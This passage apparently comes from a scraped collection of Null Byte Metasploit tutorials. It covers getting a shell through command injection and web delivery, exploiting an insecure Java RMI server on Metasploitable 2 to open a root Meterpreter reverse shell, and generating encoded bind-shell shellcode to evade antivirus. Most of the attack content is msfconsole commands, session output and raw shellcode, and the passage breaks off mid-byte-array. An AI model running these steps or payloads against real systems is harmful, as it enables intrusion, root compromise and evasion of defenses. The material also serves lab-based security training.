2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux\nPID TTY          TIME CMD\n4656 ?        00:00:00 apache2\n4658 ?        00:00:00 apache2\n4661 ?        00:00:00 apache2\n4663 ?        00:00:00 apache2\n4665 ?        00:00:00 apache2\n4761 ?        00:00:00 apache2\n4793 ?        00:00:00 apache2\n4855 ?        00:00:00 php\n4856 ?        00:00:00 sh\n4858 ?        00:00:00 php\n4869 ?        00:00:00 sh\n4873 ?        00:00:00 ps\nFrom here, we can issue commands like whoami to view the current user, uname -a to display operating system information, and ps to see a list of running processes. By exploiting command injection in a vulnerable web application, we were able to execute our web delivery script and get a shell on the target without writing anything to disk.\nWrapping Up\nIn this tutorial, we learned a bit about command injection, Metasploit's web delivery script, and how to combine the two into an effective method of attack. Since this exploit avoids writing anything to disk, it increases the chances of success in evading antivirus solutions. In the world of security, there are often many creative ways to combine different techniques to achieve results, all you have to do is look.",
        "category": "Metasploit Basics"
    },
    {
        "title": "Exploit Java Remote Method Invocation to Get Root",
        "link": "https://null-byte.wonderhowto.com/how-to/exploit-java-remote-method-invocation-get-root-0187685/",
        "content": "* WonderHowTo\nIn the world of technology, there's often a trade-off between convenience and security. The Java Remote Method Invocation is a system where that trade-off is all too real. The ability for a program written in Java to communicate with another program remotely can greatly extend the usability of an app, but it can also open up critical vulnerabilities that allow it to be compromised by an attacker.\nIn this tutorial, we will be using the Metasploit Framework to attack an insecure instance of a Java RMI server located on Metasploitable 2, a vulnerable virtual machine.\nIntroduction to Java RMI\nThe Java Remote Method Invocation, or Java RMI, is a mechanism that allows an object that exists in one Java virtual machine to access and call methods that are contained in another Java virtual machine; This is basically the same thing as a remote procedure call, but in an object-oriented paradigm instead of a procedural one, which allows for communication between Java programs that are not in the same address space.\nOne of the major advantages of RMI is the ability for remote objects to load new classes that aren't explicitly defined already, extending the behavior and functionality of an application.\nRMI applications usually consist of two programs: a client and a server. When the server is created, the methods of its objects are made available to the client. The communication is handled by two intermediary objects: the stub and the skeleton.\nThe stub is located on the client side and sends information to the server, such as an identifier for the remote object, the name of the method to be invoked, and other relevant parameters. The skeleton resides on the server and passes the request from the client to the remote object.\nVulnerabilities arise when the default, insecure configuration of the server is present, allowing for classes to be loaded from any remote URL. Since method calls to the server do not require any authentication, this can be exploited. Metasploit contains a module to scan for Java RMI endpoints, as well as a module to actively exploit this vulnerability.\nScanning for Java RMI\nStart Metasploit by typing msfconsole in the terminal. There's an auxiliary scanner we can use to detect whether the Java RMI vulnerability exists on our target; At the prompt, type search rmi and locate the \"auxiliary/scanner/misc/java_rmi_server\" module.\nmsf > search rmi\n[!] Module database cache not built yet, using slow search\nMatching Modules\n================\nName                                                            Disclosure Date  Rank       Description\n----                                                            ---------------  ----       -----------\nauxiliary/scanner/misc/java_rmi_server                          2011-10-15       normal     Java RMI Server Insecure Endpoint Code Execution Scanner\nexploit/multi/misc/java_rmi_server                              2011-10-15       excellent  Java RMI Server Insecure Default Configuration Java Code Execution\nNext, enter use auxiliary/scanner/misc/java_rmi_server and type options to display the settings.\nmsf > use auxiliary/scanner/misc/java_rmi_server\nmsf auxiliary(scanner/misc/java_rmi_server) > options\nModule options (auxiliary/scanner/misc/java_rmi_server):\nName     Current Setting  Required  Description\n----     ---------------  --------  -----------\nRHOSTS                    yes       The target address range or CIDR identifier\nRPORT    1099             yes       The target port (TCP)\nTHREADS  1                yes       The number of concurrent threads\nNow we need to specify the target by typing set rhosts 172.16.1.102 (use the IP address of your own target). We can also increase the number of threads a bit to make the scanner to run a little faster. Type set threads 16 to set the number of threads to sixteen, a relatively safe amount. Finally, type run (an alias for exploit) to scan the target.\nmsf auxiliary(scanner/misc/java_rmi_server) > set rhosts 172.16.1.102\nrhosts => 172.16.1.102\nmsf auxiliary(scanner/misc/java_rmi_server) > set threads 16\nthreads => 16\nmsf auxiliary(scanner/misc/java_rmi_server) > run\n[+] 172.16.1.102:1099     - 172.16.1.102:1099 Java RMI Endpoint Detected: Class Loader Enabled\n[*] Scanned 1 of 1 hosts (100% complete)\n[*] Auxiliary module execution completed\nWe can see that the scanner detected a Java RMI endpoint on port 1099, which suggests the target may be vulnerable. Let's try to exploit it.\nExploiting Java RMI\nBack in our previous search results, locate the \"exploit/multi/misc/java_rmi_server\" module, and type use exploit/multi/misc/java_rmi_server to load it. Now we can display the various options for this exploit.\nmsf auxiliary(scanner/misc/java_rmi_server) > use exploit/multi/misc/java_rmi_server\nmsf exploit(multi/misc/java_rmi_server) > options\nModule options (exploit/multi/misc/java_rmi_server):\nName       Current Setting  Required  Description\n----       ---------------  --------  -----------\nHTTPDELAY  10               yes       Time that the HTTP Server will wait for the payload request\nRHOST                       yes       The target address\nRPORT      1099             yes       The target port (TCP)\nSRVHOST    0.0.0.0          yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0\nSRVPORT    8080             yes       The local port to listen on.\nSSL        false            no        Negotiate SSL for incoming connections\nSSLCert                     no        Path to a custom SSL certificate (default is randomly generated)\nURIPATH                     no        The URI to use for this exploit (default is random)\nExploit target:\n0   Generic (Java Payload)\nType set rhost 172.16.1.102 (using the appropriate IP address) to specify the target. All of the other options can be left as default for now. Next, use show payloads to display the compatible payloads for this exploit.\nmsf exploit(multi/misc/java_rmi_server) > set rhost 172.16.1.102\nrhost => 172.16.1.102\nmsf exploit(multi/misc/java_rmi_server) > show payloads\nCompatible Payloads\n===================\nName                            Disclosure Date  Rank    Description\n----                            ---------------  ----    -----------\ngeneric/custom                                   normal  Custom Payload\ngeneric/shell_bind_tcp                           normal  Generic Command Shell, Bind TCP Inline\ngeneric/shell_reverse_tcp                        normal  Generic Command Shell, Reverse TCP Inline\njava/meterpreter/bind_tcp                        normal  Java Meterpreter, Java Bind TCP Stager\njava/meterpreter/reverse_http                    normal  Java Meterpreter, Java Reverse HTTP Stager\njava/meterpreter/reverse_https                   normal  Java Meterpreter, Java Reverse HTTPS Stager\njava/meterpreter/reverse_tcp                     normal  Java Meterpreter, Java Reverse TCP Stager\njava/shell/bind_tcp                              normal  Command Shell, Java Bind TCP Stager\njava/shell/reverse_tcp                           normal  Command Shell, Java Reverse TCP Stager\njava/shell_reverse_tcp                           normal  Java Command Shell, Reverse TCP Inline\nWe'll use the all-powerful Meterpreter here with a reverse TCP shell. Enter set payload java/meterpreter/reverse_tcp to enable this payload.\nmsf exploit(multi/misc/java_rmi_server) > set payload java/meterpreter/reverse_tcp\npayload => java/meterpreter/reverse_tcp\nLet's take a look at the current settings again with options.\nmsf exploit(multi/misc/java_rmi_server) > options\nModule options (exploit/multi/misc/java_rmi_server):\nName       Current Setting  Required  Description\n----       ---------------  --------  -----------\nHTTPDELAY  10               yes       Time that the HTTP Server will wait for the payload request\nRHOST      172.16.1.102     yes       The target address\nRPORT      1099             yes       The target port (TCP)\nSRVHOST    0.0.0.0          yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0\nSRVPORT    8080             yes       The local port to listen on.\nSSL        false            no        Negotiate SSL for incoming connections\nSSLCert                     no        Path to a custom SSL certificate (default is randomly generated)\nURIPATH                     no        The URI to use for this exploit (default is random)\nPayload options (java/meterpreter/reverse_tcp):\nName   Current Setting  Required  Description\n----   ---------------  --------  -----------\nLHOST                   yes       The listen address (an interface may be specified)\nLPORT  4444             yes       The listen port\nExploit target:\n0   Generic (Java Payload)\nSince we're using a reverse shell, we need to specify the listen address. Type set lhost 172.16.1.100 (the IP address of your attacking machine), and we should be good to go. Type run to launch the exploit.\nmsf exploit(multi/misc/java_rmi_server) > set lhost 172.16.1.100\nlhost => 172.16.1.100\nmsf exploit(multi/misc/java_rmi_server) > run\n[*] Started reverse TCP handler on 172.16.1.100:4444\n[*] 172.16.1.102:1099 - Using URL: http://0.0.0.0:8080/ALldcZ02dnZmL\n[*] 172.16.1.102:1099 - Local IP: http://172.16.1.100:8080/ALldcZ02dnZmL\n[*] 172.16.1.102:1099 - Server started.\n[*] 172.16.1.102:1099 - Sending RMI Header...\n[*] 172.16.1.102:1099 - Sending RMI Call...\n[*] 172.16.1.102:1099 - Replied to request for payload JAR\n[*] Sending stage (53845 bytes) to 172.16.1.102\n[*] Meterpreter session 1 opened (172.16.1.100:4444 -> 172.16.1.102:38797) at 2018-09-25 11:35:32 -0500\n[*] 172.16.1.102:1099 - Server stopped.\nmeterpreter >\nWe can see that the exploit started a handler on our system, sent the RMI method call to the target, and that a Meterpreter session was successfully opened. We can now use commands like getuid, to see the user that Meterpreter is running as on the target, and sysinfo, to display information about the target.\nmeterpreter > getuid\nServer username: root\nmeterpreter > sysinfo\nComputer    : metasploitable\nOS          : Linux 2.6.24-16-server (i386)\nMeterpreter : java/linux\nWe can also spawn a local shell with the shell command.\nmeterpreter > shell\nProcess 1 created.\nChannel 1 created.\n1: lo: <LOOPBACK,UP,LOWER_UP> mtu 16436 qdisc noqueue\nlink/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00\ninet 127.0.0.1/8 scope host lo\ninet6 ::1/128 scope host\nvalid_lft forever preferred_lft forever\n2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast qlen 1000\nlink/ether 08:00:27:77:62:6c brd ff:ff:ff:ff:ff:ff\ninet 172.16.1.102/12 brd 172.31.255.255 scope global eth0\ninet6 fe80::a00:27ff:fe77:626c/64 scope link\nvalid_lft forever preferred_lft forever\nWe are now root at this point, and from here, the world is our oyster since we essentially have full control over the target.\nWrapping Up\nGood intentions and the promise of enhanced functionality can often lead to vulnerabilities in an application, as was the case we saw here. Today, we covered the basic architecture and behavior of the Java Remote Method Invocation, how to determine if a vulnerability is present, and how to exploit that vulnerability with Metasploit to ultimately attain root access on the target. We were essentially able to own the entire system all because of an insecure configuration.",
        "category": "Metasploit Basics"
    },
    {
        "title": "Use MSFconsole's Generate Command to Obfuscate Payloads & Evade Antivirus Detection",
        "link": "https://null-byte.wonderhowto.com/how-to/use-msfconsoles-generate-command-obfuscate-payloads-evade-antivirus-detection-0187686/",
        "content": "* WonderHowTo\nOne of the things that sets a seasoned hacker apart from the script kiddies is the ability to effectively sneak past antivirus defenses when executing an attack. One way to do this is to use custom shellcode in an exploit. Not everyone is an expert at writing shellcode, but luckily there's an easy way to do this that is both quick and effective.\nAntivirus evasion is a broad field that some people devote their entire work to. It is a large part of exploit development, and it is certainly useful when trying to bypass common defense mechanisms. One of the ways to obfuscate payloads is by generating custom shellcode. This method can be utilized when developing an exploit from scratch or when using an existing exploit to better hide from antivirus software.\n* Don't Miss: How to Create an Undetectable Windows 10 Payload\nIn Metasploit, payload shellcode can be generated from within the framework. We will be using msfconsole today, which is arguably the most popular interface for Metasploit. When a payload is loaded, a few commands become available, including the generate command, which will be the focus of this guide.\nGenerating a Payload\nFirst off, let's fire up Metasploit by typing msfconsole in the terminal. Once it loads, we can choose a payload. Most any payload will suffice, but for demonstration purposes, we will be using a simple bind shell.\nType use payload/linux/x86/shell_bind_tcp to load the payload and bring it into focus, followed by help to display the available commands:\nmsf > use payload/linux/x86/shell_bind_tcp\nmsf payload(linux/x86/shell_bind_tcp) > help\nPayload Commands\n================\nCommand       Description\n-------       -----------\ncheck         Check to see if a target is vulnerable\ngenerate      Generates a payload\nreload        Reload the current module from disk\nto_handler    Creates a handler with the specified payload\nThe command we are interested in is generate, so enter generate -h to show the various options that are available:\nmsf payload(linux/x86/shell_bind_tcp) > generate -h\nUsage: generate [options]\nGenerates a payload.\n-E        Force encoding.\n-b <opt>  The list of characters to avoid: '\\x00\\xff'\n-e <opt>  The name of the encoder module to use.\n-f <opt>  The output file name (otherwise stdout)\n-h        Help banner.\n-i <opt>  the number of encoding iterations.\n-k        Keep the template executable functional\n-o <opt>  A comma separated list of options in VAR=VAL format.\n-p <opt>  The Platform for output.\n-s <opt>  NOP sled length.\n-t <opt>  The output format: bash,c,csharp,dw,dword,hex,java,js_be,js_le,num,perl,pl,powershell,ps1,py,python,raw,rb,ruby,sh,vbapplication,vbscript,asp,aspx,aspx-exe,axis2,dll,elf,elf-so,exe,exe-only,exe-service,exe-small,hta-psh,jar,jsp,loop-vbs,macho,msi,msi-nouac,osx-app,psh,psh-cmd,psh-net,psh-reflection,vba,vba-exe,vba-psh,vbs,war\n-x <opt>  The executable template to use\n* Don't Miss: What You Need to Know About Payloads in Metasploit\nOption 1: Default Generation\nWe can generate shellcode without any options, although the odds of this payload bypassing any modern antivirus software are probably pretty low. Below, we can see the size of the generated payload, 78 bytes, followed by some other settings, and finally the raw shellcode.\nmsf payload(linux/x86/shell_bind_tcp) > generate\n# linux/x86/shell_bind_tcp - 78 bytes\n# http://www.metasploit.com\n# VERBOSE=false, LPORT=4444, RHOST=, PrependFork=false,\n# PrependSetresuid=false, PrependSetreuid=false,\n# PrependSetuid=false, PrependSetresgid=false,\n# PrependSetregid=false, PrependSetgid=false,\n# PrependChrootBreak=false, AppendExit=false\n\"\\x31\\xdb\\xf7\\xe3\\x53\\x43\\x53\\x6a\\x02\\x89\\xe1\\xb0\\x66\\xcd\" +\n\"\\x80\\x5b\\x5e\\x52\\x68\\x02\\x00\\x11\\x5c\\x6a\\x10\\x51\\x50\\x89\" +\n\"\\xe1\\x6a\\x66\\x58\\xcd\\x80\\x89\\x41\\x04\\xb3\\x04\\xb0\\x66\\xcd\" +\n\"\\x80\\x43\\xb0\\x66\\xcd\\x80\\x93\\x59\\x6a\\x3f\\x58\\xcd\\x80\\x49\" +\n\"\\x79\\xf8\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\" +\n\"\\x50\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80\"\nOption 2: Use Different Encoders\nMetasploit will automatically select the best encoder for the job, by default, but we can also specify which one to use to fit custom needs. Type show encoders to see a list of the available encoders and their descriptions.\nmsf payload(linux/x86/shell_bind_tcp) > show encoders\nName                          Disclosure Date  Rank       Description\n----                          ---------------  ----       -----------\ncmd/brace                                      low        Bash Brace Expansion Command Encoder\ncmd/echo                                       good       Echo Command Encoder\ncmd/generic_sh                                 manual     Generic Shell Variable Substitution Command Encoder\ncmd/ifs                                        low        Bourne ${IFS} Substitution Command Encoder\ncmd/perl                                       normal     Perl Command Encoder\ncmd/powershell_base64                          excellent  Powershell Base64 Command Encoder\ncmd/printf_php_mq                              manual     printf(1) via PHP magic_quotes Utility Command Encoder\ngeneric/eicar                                  manual     The EICAR Encoder\ngeneric/none                                   normal     The \"none\" Encoder\nmipsbe/byte_xori                               normal     Byte XORi Encoder\nmipsbe/longxor                                 normal     XOR Encoder\nmipsle/byte_xori                               normal     Byte XORi Encoder\nmipsle/longxor                                 normal     XOR Encoder\nphp/base64                                     great      PHP Base64 Encoder\nppc/longxor                                    normal     PPC LongXOR Encoder\nppc/longxor_tag                                normal     PPC LongXOR Encoder\nruby/base64                                    great      Ruby Base64 Encoder\nFor example, we could use a simple XOR countdown encoder (x86/countdown). Specify the encoder to use with the -e flag. The generated shellcode is a little different now, in addition to being slightly larger at 94 bytes.\nmsf payload(linux/x86/shell_bind_tcp) > generate -e x86/countdown\n# linux/x86/shell_bind_tcp - 94 bytes\n# http://www.metasploit.com\n# Encoder: x86/countdown\n# VERBOSE=false, LPORT=4444, RHOST=, PrependFork=false,\n# PrependSetresuid=false, PrependSetreuid=false,\n# PrependSetuid=false, PrependSetresgid=false,\n# PrependSetregid=false, PrependSetgid=false,\n# PrependChrootBreak=false, AppendExit=false\n\"\\x6a\\x4d\\x59\\xe8\\xff\\xff\\xff\\xff\\xc1\\x5e\\x30\\x4c\\x0e\\x07\" +\n\"\\xe2\\xfa\\x30\\xd9\\xf4\\xe7\\x56\\x45\\x54\\x62\\x0b\\x83\\xea\\xbc\" +\n\"\\x6b\\xc3\\x8f\\x4b\\x4f\\x40\\x7b\\x16\\x15\\x07\\x4b\\x72\\x09\\x4b\" +\n\"\\x4b\\x95\\xfc\\x74\\x79\\x78\\xec\\xa2\\xaa\\x65\\x21\\x95\\x23\\x98\" +\n\"\\x4f\\xe7\\xab\\x6f\\x9d\\x48\\xe2\\xb0\\xa2\\x6b\\x59\\x0b\\x6d\\xfb\" +\n\"\\xb7\\x71\\x40\\xc2\\x53\\x13\\x12\\x4d\\x57\\x28\\x6e\\x20\\x2a\\x2a\" +\n\"\\xcc\\xa5\\x17\\x1b\\xc0\\xab\\xfb\\x47\\x80\\xce\"\nOption 3: Remove Bad Characters\nDepending on the target, certain characters might not be allowed to exist in the payload. The null byte (\\x00), except for in rare cases, almost always causes problems when present in a payload. To generate shellcode while removing a specific character, use the -b flag.\nmsf payload(linux/x86/shell_bind_tcp) > generate -b '\\x00'\n# linux/x86/shell_bind_tcp - 105 bytes\n# http://www.metasploit.com\n# Encoder: x86/shikata_ga_nai\n# VERBOSE=false, LPORT=4444, RHOST=, PrependFork=false,\n# PrependSetresuid=false, PrependSetreuid=false,\n# PrependSetuid=false, PrependSetresgid=false,\n# PrependSetregid=false, PrependSetgid=false,\n# PrependChrootBreak=false, AppendExit=false\n\"\\xbb\\xed\\x04\\xc7\\xf5\\xdd\\xc7\\xd9\\x74\\x24\\xf4\\x5a\\x29\\xc9\" +\n\"\\xb1\\x14\\x31\\x5a\\x14\\x83\\xc2\\x04\\x03\\x5a\\x10\\x0f\\xf1\\xf6\" +\n\"\\x2e\\x38\\x19\\xab\\x93\\x95\\xb4\\x4e\\x9d\\xf8\\xf9\\x29\\x50\\x7a\" +\n\"\\xa2\\xeb\\x38\\x12\\x57\\x14\\xac\\xbe\\x3d\\x04\\x9f\\x6e\\x4b\\xc5\" +\n\"\\x75\\xe8\\x13\\xcb\\x0a\\x7d\\xe2\\xd7\\xb9\\x79\\x55\\xb1\\x70\\x01\" +\n\"\\xd6\\x8e\\xed\\xcc\\x59\\x7d\\xa8\\xa4\\x66\\xda\\x86\\xb8\\xd0\\xa3\" +\n\"\\xe0\\xd0\\xcd\\x7c\\x62\\x48\\x7a\\xac\\xe6\\xe1\\x14\\x3b\\x05\\xa1\" +\n\"\\xbb\\xb2\\x2b\\xf1\\x37\\x08\\x2b\"\nWe can also omit multiple characters at once.\nmsf payload(linux/x86/shell_bind_tcp) > generate -b '\\x00\\xa1\\x66\\x81'\n# linux/x86/shell_bind_tcp - 105 bytes\n# http://www.metasploit.com\n# Encoder: x86/shikata_ga_nai\n# VERBOSE=false, LPORT=4444, RHOST=, PrependFork=false,\n# PrependSetresuid=false, PrependSetreuid=false,\n# PrependSetuid=false, PrependSetresgid=false,\n# PrependSetregid=false, PrependSetgid=false,\n# PrependChrootBreak=false, AppendExit=false\n\"\\xd9\\xcf\\xd9\\x74\\x24\\xf4\\x5d\\x33\\xc9\\xb1\\x14\\xb8\\xb8\\x2e\" +\n\"\\x24\\x7f\\x83\\xc5\\x04\\x31\\x45\\x15\\x03\\x45\\x15\\x5a\\xdb\\x15\" +\n\"\\xa4\\x6d\\xc7\\x05\\x19\\xc2\\x62\\xa8\\x14\\x05\\xc2\\xca\\xeb\\x45\" +\n\"\\x78\\x4d\\xa6\\x2d\\x7d\\x71\\x57\\xf1\\xeb\\x61\\x06\\x59\\x65\\x60\" +\n\"\\xc2\\x3f\\x2d\\xae\\x93\\x36\\x8c\\x34\\x27\\x4c\\xbf\\x53\\x8a\\xcc\" +\n\"\\xfc\\x2b\\x72\\x01\\x82\\xdf\\x22\\xf3\\xbc\\x87\\x19\\x83\\x8a\\x4e\" +\n\"\\x5a\\xeb\\x23\\x9e\\xe9\\x83\\x53\\xcf\\x6f\\x3a\\xca\\x86\\x93\\xec\" +\n\"\\x41\\x10\\xb2\\xbc\\x6d\\xef\\xb5\"\nAt a certain point, though, this feature has its limits. If too many characters are disallowed, the payload might not be allowed to be generated, resulting in the following error.\n[-] Payload generation failed: No encoders encoded the buffer successfully.\nRecommended Book: \"Metasploit: The Penetration Tester's Guide\" from Amazon | Walmart\nOption 4: Multiple Iterations\nAnother useful technique for bypassing antivirus is encoding the payload with multiple passes. This essentially takes the generated shellcode and runs it through the encoder again with as many passes as defined. Use the -i flag to specify the number of iterations to encode the payload with.\nmsf payload(linux/x86/shell_bind_tcp) > generate -b '\\x00\\xa1\\x66\\x81' -i 5\n# linux/x86/shell_bind_tcp - 213 bytes\n# http://www.metasploit.com\n# Encoder: x86/shikata_ga_nai\n# VERBOSE=false, LPORT=4444, RHOST=, PrependFork=false,\n# PrependSetresuid=false, PrependSetreuid=false,\n# PrependSetuid=false, PrependSetresgid=false,\n# PrependSetregid=false, PrependSetgid=false,\n# PrependChrootBreak=false, AppendExit=false\n\"\\xd9\\xc6\\xd9\\x74\\x24\\xf4\\x5f\\xbd\\x8d\\x20\\x24\\xe6\\x33\\xc9\" +\n\"\\xb1\\x2f\\x31\\x6f\\x19\\x83\\xc7\\x04\\x03\\x6f\\x15\\x6f\\xd5\\x9e\" +\n\"\\x6e\\x55\\xa6\\x85\\xb5\\x7e\\x1f\\x4d\\x6e\\x74\\xff\\x9f\\xa7\\xc5\" +\n\"\\x28\\xd1\\x60\\x30\\x2a\\x46\\x9a\\xb9\\xeb\\x6c\\x46\\xc0\\x12\\x1b\" +\n\"\\x05\\x33\\xe7\\x68\\x65\\x0c\\xc3\\x1e\\xc6\\xdb\\xd9\\x59\\x5d\\x6c\" +\n\"\\x89\\xd0\\xc9\\x26\\xd4\\x5d\\x1d\\xea\\xe0\\xbc\\x1b\\x7f\\xee\\x8d\" +\n\"\\x5f\\xaf\\xd0\\xb4\\x9e\\xec\\x3f\\x38\\x83\\x03\\x9f\\x44\\xe4\\x83\" +\n\"\\x3f\\xc9\\x4f\\x41\\x2c\\x4b\\x94\\x98\\x5d\\x4e\\x27\\x1f\\x15\\x76\" +\n\"\\xb6\\x12\\xf5\\xfd\\xf4\\x35\\x9f\\xfd\\xa3\\xd1\\x93\\xa3\\x39\\x6e\" +\n\"\\x9c\\xbe\\xd6\\xbc\\xb0\\x5a\\x6b\\x03\\x52\\x56\\x7b\\x54\\x1b\\xb6\" +\n\"\\x3c\\x4e\\xc8\\x1e\\x30\\xa5\\x1f\\xe3\\x2e\\x90\\x78\\x22\\x7d\\x67\" +\n\"\\x08\\x04\\x91\\x77\\x7e\\xde\\xce\\x4e\\xa8\\x5c\\xa3\\x77\\x63\\xe3\" +\n\"\\x67\\x41\\x2d\\x9c\\x29\\x0b\\x57\\x02\\x23\\x50\\x1b\\x8a\\x82\\xbe\" +\n\"\\x0e\\x5e\\x8a\\x96\\x5e\\x1d\\x65\\xbe\\x3b\\x51\\x80\\xa5\\x0f\\x8f\" +\n\"\\x30\\xdf\\x12\\xd0\\x80\\xa6\\x4c\\x1a\\xf0\\xc2\\x17\\xdd\\xa3\\x7d\" +\n\"\\x2d\\xc1\\x0c\"\nOption 5: Combine Options\nKeep in mind, we can combine multiple options when generating shellcode in order to better our chances at evading antivirus detection. If we look closely, the default listen port for our bind shell is set to 4444. We can change that, and any other option for that matter, by using the -o flag followed by the variable and the value to set. Let's change the listen port to 1234.\nmsf payload(linux/x86/shell_bind_tcp) > generate -b '\\x00\\xa1\\x66\\x81' -i 5 -o lport=1234\n# linux/x86/shell_bind_tcp - 213 bytes\n# http://www.metasploit.com\n# Encoder: x86/shikata_ga_nai\n# VERBOSE=false, LPORT=1234, RHOST=, PrependFork=false,\n# PrependSetresuid=false, PrependSetreuid=false,\n# PrependSetuid=false, PrependSetresgid=false,\n# PrependSetregid=false, PrependSetgid=false,\n# PrependChrootBreak=false, AppendExit=false\n\"\\xb8\\xee\\x58\\x02\\xcc\\xda\\xcc\\xd9\\x74\\x24\\xf4\\x5a\\x2b\\xc9\" +\n\"\\xb1\\x2f\\x83\\xea\\xfc\\x31\\x42\\x10\\x03\\x42\\x10\\x0c\\xad\\xd8\" +\n\"\\x01\\x6a\\x27\\x02\\xd8\\xa0\\x61\\xc8\\xff\\x40\\xcf\\x18\\xc9\\x19\" +\n\"\\xd8\\x6b\\x9f\\x43\\x9a\\x4a\\x1b\\x70\\xca\\x44\\xc6\\xea\\x96\\xe7\" +\n\"\\x07\\x35\\x8e\\x31\\x9f\\x37\\x99\\x0f\\x70\\xaa\\xba\\x48\\xd9\\x1b\" +\n\"\\x88\\xdd\\xc2\\x4f\\x1a\\xc7\\xac\\xb6\\xe7\\xd4\\x86\\xdd\\x24\\x1b\" +\n\"\\xa0\\x60\\x51\\x78\\x01\\x37\\x50\\x84\\x39\\xe3\\xe1\\x95\\x18\\x65\" +\n\"\\xfb\\x97\\x75\\xc2\\x7f\\x82\\xcd\\x93\\xf1\\x4e\\x49\\xff\\x99\\xde\" +\n\"\\x85\\x10\\xf9\\xad\\x4c\\xec\\x37\\xb4\\x04\\x1c\\xb0\\xc6\\xcf\\x55\" +\n\"\\x6a\\xa9\\x68\\xc6\\x84\\xad\\xba\\xfa\\x59\\x3a\\x02\\xbf\\x32\\x55\" +\n\"\\x9d\\x9f\\x76\\x80\\x54\\xd9\\xcc\\x03\\x8c\\x65\\x2b\\x8f\\xdc\\x4c\" +\n\"\\xd9\\x6f\\x6f\\x6e\\x0e\\x8a\\x8a\\xa8\\x14\\xb9\\x2d\\x70\\x78\\xed\" +\n\"\\xa2\\x24\\xac\\xf1\\x15\\xd0\\x90\\xeb\\x38\\x56\\x52\\x6b\\xf3\\xeb\" +\n\"\\x77\\x21\\xeb\\x3d\\x64\\xf9\\xc3\\x65\\xe3\\xab\\x5c\\xd5\\xaa\\x3d\" +\n\"\\x07\\xa0\\x95\\x3f\\xd3\\x9b\\xc9\\x48\\x52\\x0b\\x15\\x42\\xa8\\x2d\" +\n\"\\x54\\x01\\x4f\"\nOption 6: Output Formats\nAnother extremely useful feature is the ability to encode the payload in different output formats. A listing of the available formats can be seen by viewing the help options, with the generate -h command. To generate shellcode in Java format, for example, we can use the -t flag. We can see that the output looks a little different than before since the shellcode is in another format now.\nmsf payload(linux/x86/shell_bind_tcp) > generate -b '\\x00\\xa1\\x66\\x81' -i 5 -o lport=1234 -t java\n* linux/x86/shell_bind_tcp - 213 bytes\n* http://www.metasploit.com\n* Encoder: x86/shikata_ga_nai\n* VERBOSE=false, LPORT=1234, RHOST=, PrependFork=false,\n* PrependSetresuid=false, PrependSetreuid=false,\n* PrependSetuid=false, PrependSetresgid=false,\n* PrependSetregid=false, PrependSetgid=false,\n* PrependChrootBreak=false, AppendExit=false\nbyte buf[] = new byte[]\n(byte) 0xbd, (byte) 0x47, (byte) 0xcc, (byte) 0x2b, (byte) 0x9a, (byte) 0xd9, (byte) 0xc7, (byte) 0xd9,\n(byte) 0x74, (byte) 0x24, (byte) 0xf4, (byte) 0x5a, (byte) 0x33, (byte) 0xc9, (byte) 0xb1, (byte) 0x2f,\n(byte) 0x31, (byte) 0x6a, (byte) 0x14, (byte) 0x83, (byte) 0xea, (byte) 0xfc, (byte) 0x03, (byte) 0x6a,\n(byte) 0x10, (byte) 0xa5, (byte) 0x39, (byte) 0xf0, (byte) 0x4c, (byte) 0x93, (byte) 0x94, (byte) 0x72,\n(byte) 0x6d, (byte) 0x33, (byte) 0xc1, (byte) 0x09, (byte) 0xa9, (byte) 0x47, (byte) 0xaa, (byte) 0xd8,\n(byte) 0x78, (byte) 0x16, (byte) 0x63, (byte) 0x98, (byte) 0xbb, (byte) 0x5c, (byte) 0x45, (byte) 0xce,\n(byte) 0x2d, (byte) 0x5f, (byte) 0xf5, (byte) 0xf8, (byte) 0xb3, (byte) 0xfc, (byte) 0x59, (byte) 0xd8,\n(byte) 0x5c, (byte) 0x95, (byte) 0x72, (byte) 0x82, (byte) 0x0f, (byte) 0x67, (byte) 0xe9, (byte) 0xfa,\n(byte) 0x60, (byte) 0xcd, (byte) 0x43, (byte) 0x0c, (byte) 0xa8, (byte) 0x89, (byte) 0xe7, (byte) 0xc5,\n(byte) 0xf7, (byte) 0x96, (byte) 0x64, (byte) 0x15, (byte) 0x65, (byte) 0x09, (byte) 0x99, (byte) 0x25,\n(byte) 0xe0, (byte) 0x91, (byte) 0xd2, (byte) 0x61, (byte) 0xc3, (byte) 0x9e, (byte) 0xed, (byte) 0xed,\n(byte) 0x87, (byte) 0xd4, (byte) 0x83, (byte) 0xbb, (byte) 0x5d, (byte) 0x46, (byte) 0xaa, (byte) 0x4d,\n(byte) 0x1a, (byte) 0xd9, (byte) 0x1a, (byte) 0x3c, (byte) 0xf9, (byte) 0xa5, (byte) 0x44, (byte) 0xb6,\n(byte) 0x47, (byte) 0xe2, (byte) 0x82, (byte) 0x58, (byte) 0xe4, (byte) 0xf7, (byte) 0x30, (byte) 0x9b,\n(byte) 0x6a, (byte) 0x0b, (byte) 0xa7, (byte) 0xf9, (byte) 0xb5, (byte) 0x23, (byte) 0x99, (byte) 0x54,\n(byte) 0xc6, (byte) 0x0f, (byte) 0x4a, (byte) 0x63, (byte) 0x08, (byte) 0xe3, (byte) 0xeb, (byte) 0xc4,\n(byte) 0x39, (byte) 0xa2, (byte) 0xe7, (byte) 0x1f, (byte) 0x87, (byte) 0x0e, (byte) 0xc9, (byte) 0x94,\n(byte) 0xc2, (byte) 0x1d, (byte) 0x39, (byte) 0xba, (byte) 0xd4, (byte) 0x98, (byte) 0x53, (byte) 0x5b,\n(byte) 0xfa, (byte) 0x42, (byte) 0x27, (byte) 0x10, (byte) 0xf1, (byte) 0x82, (byte) 0xd3, (byte) 0x7c,\n(byte) 0x67, (byte) 0x13, (byte) 0x90, (byte) 0xbc, (byte) 0xaf, (byte) 0xb6, (byte) 0xcb, (byte) 0x6b,\n(byte) 0x50, (byte) 0x62, (byte) 0xee, (byte) 0xaa, (byte) 0x80, (byte) 0x6e, (byte) 0x75, (byte) 0x5e,\n(byte) 0x9b, (byte) 0xcc, (byte) 0xf6, (byte) 0x3f, (byte) 0xde, (byte) 0xd9, (byte) 0xa2, (byte) 